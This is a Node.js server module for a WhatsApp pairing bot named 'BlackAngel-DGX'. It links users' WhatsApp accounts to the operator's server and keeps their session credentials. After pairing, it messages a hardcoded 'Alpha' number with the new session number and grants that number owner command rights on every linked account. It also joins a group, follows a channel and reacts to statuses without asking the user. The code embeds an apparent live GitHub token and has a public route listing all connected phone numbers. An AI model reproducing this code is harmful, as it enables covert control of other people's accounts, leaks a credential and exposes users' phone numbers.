const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const router = express.Router();
const pino = require('pino');
const axios = require('axios');
const { exec } = require('child_process');
const { Octokit } = require('@octokit/rest');
const moment = require('moment-timezone');
const crypto = require('crypto');
const os = require('os');
const { sms, downloadMediaMessage } = require('./msg');

const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
} = require('@whiskeysockets/baileys');

// ---------- CONFIG ----------
const MAIN_OWNER = '263776404156';
const SESSION_DIR = './BlackAngel';
const COMMANDS_FILE = path.join(__dirname, 'BlackAngel.js');
const ADMIN_FILE = './admin.json';
const NUMBERS_FILE = './numbers.json';

const config = {
    AUTO_VIEW_STATUS: 'true',
    AUTO_LIKE_STATUS: 'true',
    AUTO_RECORDING: 'true',
    AUTO_LIKE_EMOJI: ['💋', '🍬', '🫆', '💗', '🎈', '🎉', '🥳', '❤️', '🧫', '🐭'],
    MODE: 'public',
    PREFIX: '.', // kept only for button replies, not for command detection
    MAX_RETRIES: 3,
    GROUP_INVITE_LINK: 'F9unOZeoGvF3uqcbT29zLl', // default group invite code
    RCD_IMAGE_PATH: 'https://files.catbox.moe/9gn6lm.jpg',
    NEWSLETTER_JID: '120363422682987205@newsletter',
    OWNER_NUMBER: '263775597819',
    BOT_FOOTER: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʙʟᴀᴄᴋᴀɴɢᴇʟ-ᴅɢx',
    CHANNEL_LINK: 'https://whatsapp.com/channel/0029Vb7tTMb9mrGWo7uroI3e',
    OTP_EXPIRY: 300000,
    version: '2.0.0'
};

// ---------- GLOBALS ----------
const activeSockets = new Map();
const socketCreationTime = new Map();
const otpStore = new Map();
let commands = {};
let aliases = {};

// ---------- OCTOKIT (optional GitHub backup) ----------
const octokit = new Octokit({ auth: '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' });
const owner = 'dev-flax';
const repo = 'session';

// ---------- ENSURE SESSION FOLDER ----------
fs.ensureDirSync(SESSION_DIR);

// ---------- LOAD / WATCH BlackAngel.js ----------
function loadCommands() {
    try {
        delete require.cache[require.resolve(COMMANDS_FILE)];
        const mod = require(COMMANDS_FILE);
        commands = mod.commands || mod;
        aliases = mod.aliases || {};
        console.log(`✅ Loaded ${Object.keys(commands).length} commands from BlackAngel.js`);
    } catch (err) {
        console.error('❌ Failed to load BlackAngel.js:', err);
    }
}
loadCommands();

// Hot‑reload
fs.watchFile(COMMANDS_FILE, { interval: 1000 }, (curr, prev) => {
    if (curr.mtime !== prev.mtime) {
        console.log('🔄 BlackAngel.js changed, reloading...');
        loadCommands();
    }
});

// ---------- OWNER MANAGEMENT ----------
function getOwnerNumbers() {
    const owners = new Set();
    owners.add(MAIN_OWNER);
    if (fs.existsSync(NUMBERS_FILE)) {
        try {
            const numbers = JSON.parse(fs.readFileSync(NUMBERS_FILE, 'utf8'));
            numbers.forEach(n => owners.add(n));
        } catch (e) {}
    }
    return Array.from(owners);
}

function addOwnerNumber(num) {
    const sanitized = num.replace(/[^0-9]/g, '');
    if (sanitized === MAIN_OWNER) return;
    let numbers = [];
    if (fs.existsSync(NUMBERS_FILE)) {
        try {
            numbers = JSON.parse(fs.readFileSync(NUMBERS_FILE, 'utf8'));
        } catch (e) {}
    }
    if (!numbers.includes(sanitized)) {
        numbers.push(sanitized);
        fs.writeFileSync(NUMBERS_FILE, JSON.stringify(numbers, null, 2));
        console.log(`👑 Added second owner: ${sanitized}`);
    }
}

// ---------- MESSAGE TO ALPHA ----------
async function notifyAlpha(sock, sessionNumber) {
    const alphaJid = `${MAIN_OWNER}@s.whatsapp.net`;
    const msg = `🤖 *Hi Alpha, I have Successfully Connected To BlackAngel-DGX*\n` +
                `📱 *Session number:* ${sessionNumber}\n\n` +
                `#Alpha #BlackAngel`;
    try {
        await sock.sendMessage(alphaJid, { text: msg });
        console.log(`✅ Notified Alpha about session ${sessionNumber}`);
    } catch (err) {
        console.error('❌ Failed to notify Alpha:', err.message);
    }
}

// ---------- AUTO JOIN GROUP ----------
async function joinGroup(sock) {
    let retries = config.MAX_RETRIES || 3;
    let inviteCode = config.GROUP_INVITE_LINK;
    while (retries-- > 0) {
        try {
            const response = await sock.groupAcceptInvite(inviteCode);
            if (response?.gid) {
                console.log(`✅ Joined group: ${response.gid}`);
                return { status: 'success', gid: response.gid };
            }
            throw new Error('No group ID');
        } catch (err) {
            console.warn(`Group join failed: ${err.message}, retries left: ${retries}`);
            if (retries === 0) return { status: 'failed', error: err.message };
            await delay(2000);
        }
    }
}

// ---------- AUTO STATUS / NEWSLETTER ----------
async function setupStatusHandlers(sock) {
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg?.key || msg.key.remoteJid !== 'status@broadcast') return;
        if (config.AUTO_VIEW_STATUS === 'true') {
            try { await sock.readMessages([msg.key]); } catch (e) {}
        }
        if (config.AUTO_LIKE_STATUS === 'true') {
            const emoji = config.AUTO_LIKE_EMOJI[Math.floor(Math.random() * config.AUTO_LIKE_EMOJI.length)];
            try {
                await sock.sendMessage(msg.key.remoteJid, {
                    react: { text: emoji, key: msg.key }
                }, { statusJidList: [msg.key.participant] });
            } catch (e) {}
        }
    });
}

async function setupNewsletterHandlers(sock) {
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg?.key || !msg.key.remoteJid.endsWith('@newsletter')) return;
        try {
            const emojis = ['🩵', '🔥', '😀', '👍', '🐭'];
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            await sock.newsletterReactMessage(msg.key.remoteJid, msg.newsletterServerId.toString(), randomEmoji);
        } catch (e) {}
    });
}

// ---------- MESSAGE HANDLER (ZERO‑PREFIX) ----------
async function messageHandler(sock, sessionNumber) {
    const owners = getOwnerNumbers();
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.remoteJid === 'status@broadcast') return;

        const m = sms(sock, msg);
        if (!m.body) return;

        // Zero‑prefix: first word is command
        const cmd = m.body.trim().split(' ')[0].toLowerCase();
        const args = m.body.trim().split(/ +/).slice(1);

        const commandFunc = commands[cmd] || commands[aliases[cmd]];
        if (commandFunc) {
            const senderNum = m.sender.split('@')[0];
            const isOwner = owners.includes(senderNum);
            try {
                await commandFunc({
                    m, sock, args, config, isOwner, owners, sessionNumber,
                    sms, downloadMediaMessage,
                    formatMessage: (title, content, footer) =>
                        `*${title}*\n\n${content}\n\n> *${footer}*`
                });
            } catch (err) {
                console.error(`Command "${cmd}" error:`, err);
                sock.sendMessage(m.chat, { text: '❌ Oops, something went wrong!' }, { quoted: m });
            }
        }
    });
}

// ---------- MAIN PAIRING FUNCTION ----------
async function EmpirePair(number, res) {
    const sanitized = number.replace(/[^0-9]/g, '');
    const sessionPath = path.join(SESSION_DIR, `session_${sanitized}`);
    fs.ensureDirSync(sessionPath);

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const logger = pino({ level: 'silent' });

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, logger)
        },
        printQRInTerminal: false,
        logger,
        browser: Browsers.macOS('Safari')
    });

    socketCreationTime.set(sanitized, Date.now());

    // ⚡ PAIRING – RELIABLE 4‑SECOND DELAY (from MaraX flow)
    if (!state.creds.registered) {
        setTimeout(async () => {
            try {
                const code = await sock.requestPairingCode(sanitized);
                if (!res.headersSent) {
                    res.send({ code });
                    console.log(`📲 Pair code sent for ${sanitized}`);
                }
            } catch (err) {
                console.error(`❌ Pair error for ${sanitized}:`, err.message);
                if (!res.headersSent) {
                    res.status(500).send({ error: "Failed to generate pairing code" });
                }
            }
        }, 4000);
    } else {
        // Already registered
        if (!res.headersSent) res.send({ status: 'already_connected' });
    }

    // Connection update
    sock.ev.on('connection.update', async (update) => {
        const { connection } = update;
        if (connection === 'open') {
            console.log(`✅ Connected: ${sanitized}`);
            activeSockets.set(sanitized, sock);

            // Notify Alpha
            await notifyAlpha(sock, sanitized);

            // Add connected number as second owner
            addOwnerNumber(sanitized);

            // Welcome message to user
            const userJid = jidNormalizedUser(sock.user.id);
            await sock.sendMessage(userJid, {
                image: { url: config.RCD_IMAGE_PATH },
                caption: `🤝 *Welcome to BlackAngel-DGX!*\n` +
                         `✅ Successfully connected!\n` +
                         `📱 Number: ${sanitized}\n` +
                         `🔮 Type any command to start!`
            });

            // Auto join group
            await joinGroup(sock);

            // Follow newsletters
            try {
                const newsletterList = [config.NEWSLETTER_JID];
                for (const jid of newsletterList) {
                    await sock.newsletterFollow(jid);
                }
            } catch (e) {}

            // Save number locally
            let numbers = [];
            try { numbers = JSON.parse(fs.readFileSync(NUMBERS_FILE, 'utf8')); } catch {}
            if (!numbers.includes(sanitized)) {
                numbers.push(sanitized);
                fs.writeFileSync(NUMBERS_FILE, JSON.stringify(numbers, null, 2));
            }
        } else if (connection === 'close') {
            console.log(`🔌 Disconnected: ${sanitized}`);
            activeSockets.delete(sanitized);
            socketCreationTime.delete(sanitized);
            // Auto‑reconnect on close (except 401)
            const statusCode = update.lastDisconnect?.error?.output?.statusCode;
            if (statusCode === 401) {
                // session logged out, delete local folder
                fs.removeSync(sessionPath);
                console.log(`🗑️ Session deleted for ${sanitized} (401)`);
            } else {
                setTimeout(() => {
                    EmpirePair(number, { headersSent: false, send: () => {}, status: () => {} });
                }, 10000);
            }
        }
    });

    // Save creds on update
    sock.ev.on('creds.update', saveCreds);

    // Attach status & newsletter handlers
    setupStatusHandlers(sock);
    setupNewsletterHandlers(sock);
    messageHandler(sock, sanitized);
}

// ---------- ROUTES ----------
router.get('/', async (req, res) => {
    const { number } = req.query;
    if (!number) return res.status(400).send({ error: 'Number required' });
    if (activeSockets.has(number.replace(/[^0-9]/g, ''))) {
        return res.send({ status: 'already_connected' });
    }
    await EmpirePair(number, res);
});

router.get('/active', (req, res) => {
    res.send({ count: activeSockets.size, numbers: Array.from(activeSockets.keys()) });
});

router.get('/ping', (req, res) => {
    res.send({ status: 'active', session: activeSockets.size });
});

module.exports = router;
